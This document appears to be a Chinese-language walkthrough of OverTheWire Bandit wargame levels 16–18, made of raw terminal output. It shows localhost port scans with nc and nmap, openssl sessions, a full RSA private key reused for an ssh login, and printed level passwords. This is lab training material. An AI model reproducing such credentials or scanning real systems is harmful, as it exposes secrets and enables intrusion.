CERTIFICATE-----MIICBjCCAW+gAwIBAgIEYo1NxTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwHhcNMjAwMTA1MTQzNTU4WhcNMjEwMTA0MTQzNTU4WjAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKF4u2eua8VipZPviX0hfNiCnaD2ojAffdBhKTy1bmZSNRuHPBDnU7z8rblNSknSjCITda1CGEAI8ZktRbtLpBTbYeTgqPN/EiN5UIRMKbU6P2O93zNFPBsmyfQLrgt+DSLnsxlBi/yYyT7WLdtNVBpgwRwkqi9K7dk9vf9waswLAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4GBAJECW6IB3Ria4xG002BqD3zEbtmrDlK6nmJq+uQ4eJ6cT18o9REbnpy/lFzlv2LfcrYAnuAp6Fh89MKaYjNzJURjRQ9RkmcYgQJa1n+OBkATb7V+84/ak9PDRkscxdNFMGBSvzFD33XZ5lbaGdrwCPyoxenoYghV/753wffN7J6H-----END CERTIFICATE-----subject=/CN=localhostissuer=/CN=localhost---No client certificate CA names sentPeer signing digest: SHA512Server Temp Key: X25519, 253 bits---SSL handshake has read 1019 bytes and written 269 bytesVerification error: self signed certificate---New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384Server public key is 1024 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 7EEA483CA2D18FE7CB98BB6A1CC800C7BE4444E492EBFD398DDA8EABD18712C2 Session-ID-ctx: Master-Key: D0D0B7463ABC8AD513D016BEBF3932F325BE53DBBA712624C9E820AB95735BF63FA59EAECFF34AE5523F2E05BC8BE5F2 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 56 e9 4e 87 6a 28 48 d0-13 42 5f b9 61 b0 dd d0 V.N.j(H..B_.a... 0010 - d6 bb 15 df 9d 3a 2c 9f-2d 88 a4 e2 b8 ec 36 de .....:,.-.....6. 0020 - 6c ba 2d ac d0 d4 0b 12-d1 76 ac cd 8f 8d 4d b9 l.-......v....M. 0030 - e4 8d 7f 9e 0b f5 2a 67-42 6c 52 08 94 27 09 75 ......*gBlR..'.u 0040 - 67 e5 8a 66 24 50 4f db-a7 9d 01 0d 81 ba b3 12 g..f$PO......... 0050 - c5 2e 8d ee ef 0a 2d 6d-a0 89 72 36 18 30 b2 24 ......-m..r6.0.$ 0060 - fa 82 0a b5 9d da d2 55-70 a7 fd 6d 3f 96 9e 85 .......Up..m?... 0070 - 8f e8 f8 8d 0e 29 0f 84-12 97 9c 31 7d 79 ef 75 .....).....1&#125;y.u 0080 - f5 f9 f6 cc 74 29 58 a0-a9 48 f5 17 c4 1d 73 ba ....t)X..H....s. 0090 - f1 30 ce 52 12 b6 e2 c2-75 f9 94 b9 04 2a a9 d8 .0.R....u....*.. Start Time: 1581676007 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes---BfMYroe26WYalil77FoDi9qh59eK5xNrCorrect!cluFn7wTiGryunymYOu4RcffSxQluehdclosedbandit15@bandit:~$ level 17这道题要我们在给定范围内找出正确的端口，nc，nmap都可以用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217bandit16@bandit:~$ nc -zv localhost 31000-32000localhost [127.0.0.1] 31790 (?) openlocalhost [127.0.0.1] 31518 (?) openbandit16@bandit:~$ nmap localhost -p31000-32000 -vStarting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CETInitiating Ping Scan at 11:38Scanning localhost (127.0.0.1) [2 ports]Completed Ping Scan at 11:38, 0.00s elapsed (1 total hosts)Initiating Connect Scan at 11:38Scanning localhost (127.0.0.1) [1001 ports]Discovered open port 31518/tcp on 127.0.0.1Discovered open port 31790/tcp on 127.0.0.1Completed Connect Scan at 11:38, 0.04s elapsed (1001 total ports)Nmap scan report for localhost (127.0.0.1)Host is up (0.00026s latency).Not shown: 999 closed portsPORT STATE SERVICE31518/tcp open unknown31790/tcp open unknownRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.09 secondsbandit16@bandit:~$bandit16@bandit:~$bandit16@bandit:~$ nmap localhost -p31000-32000 Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CETNmap scan report for localhost (127.0.0.1)Host is up (0.00024s latency).Not shown: 999 closed portsPORT STATE SERVICE31518/tcp open unknown31790/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 0.10 secondsbandit16@bandit:~$ bandit16@bandit:~$bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eofCONNECTED(00000003)depth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1---Certificate chain 0 s:/CN=localhost i:/CN=localhost---Server certificate-----BEGIN CERTIFICATE-----MIICBjCCAW+gAwIBAgIEGPttrzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwHhcNMjAwMjA5MjA0NzE5WhcNMjEwMjA4MjA0NzE5WjAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAPiElqK1D097ZCNDgKFxqX1ZUUpFfuoiDSP2dw5KrIruaTQMmfqCxo6dSHvkj1sF//YRI28kBGyu9pE3zLO45uk4PrjoORYLoQjTCb61oVZLECCOIG21WQUbrhjW4zlZGmtWrqw6zGLk7dZ8MeYHVSvK0n3Ar45hVedpsLC618ZTAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4GBADJEAM0VceCYaqhfzpzkzf6dhCIWbb/8P+51Wxw24sn9iLHxdqYe1WNfxtQb8IYb3q/6JJDJ3d6plNKmFMkFBe5AiN05PCDeMymkTv8vlKj18UNR/4GLAH1aFGcEYVXkwX0Kl844muUrK7S0AbOvcHmzzA++qTmfB1UK264G0iAH-----END CERTIFICATE-----subject=/CN=localhostissuer=/CN=localhost---No client certificate CA names sentPeer signing digest: SHA512Server Temp Key: X25519, 253 bits---SSL handshake has read 1019 bytes and written 269 bytesVerification error: self signed certificate---New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384Server public key is 1024 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: EE1156EF7A043D8173A15CB87FC41D8BB3F61517B8414D62065541FD97928592 Session-ID-ctx: Master-Key: 2E3037DCB9B4278B13DF68BE8111918D2D978F1B5F190052A0435E6BDD2ACE5751723FB13856C5E98F01240F88914768 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 9f 82 12 97 ac 31 10 5b-65 4b 5d fb 71 e9 e8 02 .....1.[eK].q... 0010 - cc 56 9a 1f 91 2b c2 22-7e 93 d9 42 cd 60 56 ab .V...+."~..B.`V. 0020 - 89 76 d6 95 7a b7 7e c7-6f d3 a2 95 a5 ee f2 b4 .v..z.~.o....... 0030 - 4d 48 68 f1 bf 23 df 87-de dd 64 a5 24 1e 1c e7 MHh..#....d.$... 0040 - 0b c3 f4 b2 c4 72 b9 61-26 3c 17 dd 78 61 68 dd .....r.a&amp;&lt;..xah. 0050 - b8 59 36 15 76 19 6f 19-19 14 73 df 2d 8b 66 71 .Y6.v.o...s.-.fq 0060 - f2 83 0b 22 52 07 69 ba-83 15 0a cc 94 fe f9 07 ..."R.i......... 0070 - 01 72 d2 18 de 60 42 c1-f5 8d 19 88 4b c9 74 bf .r...`B.....K.t. 0080 - ad f5 bf 2b 53 3b 42 ab-89 eb 0c 52 82 de 55 b3 ...+S;B....R..U. 0090 - e0 8d 53 85 17 d3 3a 8a-1e 80 71 09 54 5d 3c f8 ..S...:...q.T]&lt;. Start Time: 1581676499 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes---cluFn7wTiGryunymYOu4RcffSxQluehdCorrect!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----closedbandit16@bandit:~$ openssl s_client -connect localhost:31518 -ign_eofCONNECTED(00000003)depth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1---Certificate chain 0 s:/CN=localhost i:/CN=localhost---Server certificate-----BEGIN CERTIFICATE-----MIICBjCCAW+gAwIBAgIES250rzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwHhcNMjAwMjA5MjA0NzIwWhcNMjEwMjA4MjA0NzIwWjAUMRIwEAYDVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANWyxh7KT86zWM4NFe95x2KNEBUDz2XlGvU7KxUM9z1OfakmLDYCiujYdR6gI4ZBtyhEql5PtaCiNWO+ZDJCKWhjH/TyIywxjW9/PBHRC8UEzhsxc0wMHbLrlYFwzxT2KjhI3EVY5VIWkzKrgHuON6PuBbmN0g0z5NN/xYch4kPpAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4GBAFX4+KlTXWb4R/pUVt7i4FWvp3CuqgLUtgU3vRZqJ3wShIyDbsFKa4S9uSuWcLLvyq0aa4kLhmoepyNlI3BGUSZZbRXwo/1e5IpCX3RdHhlIc3/Sd7lnusTkejgEftWMmmBc03RY07EMxbNeXE8zzh2NP+5kVfwWG6GoGuQMXhy8-----END CERTIFICATE-----subject=/CN=localhostissuer=/CN=localhost---No client certificate CA names sentPeer signing digest: SHA512Server Temp Key: X25519, 253 bits---SSL handshake has read 1019 bytes and written 269 bytesVerification error: self signed certificate---New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384Server public key is 1024 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 8F0B20A8164B9ED461FBD0721FA2A8AA489C77A00124ACE93381D0512F7A2740 Session-ID-ctx: Master-Key: F880B59CBA1854941DFA1C725F833F75B1177248D9651876542343A15AF9E24A45078F96FD305D27CFBE70486DF2EAA3 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 26 1a 05 91 72 ce a3 a6-e5 fa 17 b1 24 c4 2b 6f &amp;...r.......$.+o 0010 - 1d a9 b9 da 93 9a 35 e5-f1 7e fc 83 02 92 06 6a ......5..~.....j 0020 - d3 db 90 bb ec c3 bb c3-fe 8f a3 af 08 39 47 35 .............9G5 0030 - 61 90 8c 2b 82 e3 28 b3-16 e9 f9 6a 4c c1 59 2d a..+..(....jL.Y- 0040 - c3 50 40 7a ca b9 c0 54-c8 d9 0b 9b f0 2c 7b fa .P@z...T.....,&#123;. 0050 - c7 a4 9a bf c7 f6 e6 0e-bf 07 dc 50 a3 bf 23 48 ...........P..#H 0060 - e9 0f f3 fb b9 b4 39 1d-c0 0d 71 e2 80 05 fe e7 ......9...q..... 0070 - ed 38 48 55 d7 f0 b7 97-f1 a1 c2 06 1b 47 7d 51 .8HU.........G&#125;Q 0080 - 1e cc 4d e8 0e 76 73 0a-20 24 37 6f 20 c7 ca e7 ..M..vs. $7o ... 0090 - 5b bc 44 09 ad d6 8d 5c-e3 96 86 fd 7d d8 41 75 [.D....\....&#125;.Au Start Time: 1581676568 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes---cluFn7wTiGryunymYOu4RcffSxQluehdcluFn7wTiGryunymYOu4RcffSxQluehd^Cbandit16@bandit:~$ nmap扫端口是真的快 level 181234567891011121314151617181920212223242526272829303132333435363738394041424344454647bl@bl-virtual-machine:~/wargame$ echo '-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----' &gt; b16.rsabl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for 'b16.rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key "b16.rsa": bad permissionsbandit17@bandit.labs.overthewire.org's password: bl@bl-virtual-machine:~/wargame$ chmod 600 b16.rsa bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit17@bandit:~$ cat /etc/bandit_pass/bandit17xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn 之前没注意，ssh私钥需要600权限，登进去之后就顺手看了下密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211bandit17@bandit:~$ lspasswords.new passwords.oldbandit17@bandit:~$ strings passwords.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@bandit:~$ strings passwords.new4d22drdsITVoHcfd8bAHeeKrdL3mMHpUQeGg8ya1PGU13yp57EWuUaxErl8VWjlMCUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ72hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqIWxgyH7990nLi81smXOeDGnKTpZTlAU3fg4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6MBf7rFYTik6DurpaVdC5mXngsTiXWwhv3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7ibm9g6Ypy9zVLojtpPaKBKViAKnL19QEYN2rkdeuoi1RBXCiCDQWlk4BU76M3wJFvPR0AOkN4NodK61ewgBHS56sEDr3LAobbCaVTEQzrWPuDvBm9D4CGL8BSC4arizFqFgheNL06s1UCW8UiuFUWSmtGedi2TxIHLvh1gpC39tdJMAJH0atjJLF4yRlCoSH4OpTHYem6UHMY2zLgwm2sI4e1faHw0M1bZ84471LxMWArPnxJGsMmvvl2qCcBXZ7MCExYI7LMdZLSj9AiFp8rutQY6uIcqdfxlC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqnbbctuDOWMvYUCWAiY7APEUnYPUo0zYiTsCepFVPJBglEuU8uY0LllG1oIJ2HOvrHo9sp7odH3blIlshg2aCrWPdzuDq5lxx597Vd3224QGOfsPGwjURphDfn7ISeXd3STz97n5taD1ZskKSlC1WHDU1CZZ5I3PnMNDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjTpd1THzlzKbAnR9uPnI75EpXdZVUFyVD9GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9IqLufXtxv2XKcjrWDqIojlINiJhU9LYCpkpxAYarBToFo4Vsr1jDBQREvRtbUA9i2s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJm0q33SCpHDBfTL2yRb8Db2lb6qIX8hjfxhHqvStzyrj0k1eLNbiQHmadzlY80iZgFExGbU63PyeJsfxtoIaVjiFKXAhEon0C04y09Cd0CvZBSnrC1BjauTj70D3P84GwKr58zsSpmfKy4ILtUqbo2hqooPHnI13LruisEF4OA3MyOdLEFwVdW84ZwJXRioRTkN2hWkHUehtqqWpnZW1CulYiOv8RJwPlV045YMJnMGdta9yQD8ALdny0hholXmdwgZ5U640FLMMChheWKHNdaQ1lKzLuqjxZAl0xVJb5bEzhnFG8nPFe6IJa2FjXVSzoCT2ZJy6MoLkTqdHuhL5zUIsW41WCntAAkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd46lUvvv0JJzyY0IOhWgGp5IjfsllmvaCFcSd4Me936rwbk2pAU9ylx9NXTrzdCaXvfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZmOWgkKPfjXibrdfgG57CWMcbeqBRg4IUVudOaCtkUbhOdF7dE7KACOqH0R9weDhQvzwsuF0cp5IrmEmGb7qNr4VUlsLi463tymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhWta02hN70k7BoxfiVn7viAFoWKaGDOKnCbPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMUVUcDEAfnRTt8nTlAd55q94L6rr0jfCCUQAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9X1NUQJrIsrNfaGHMU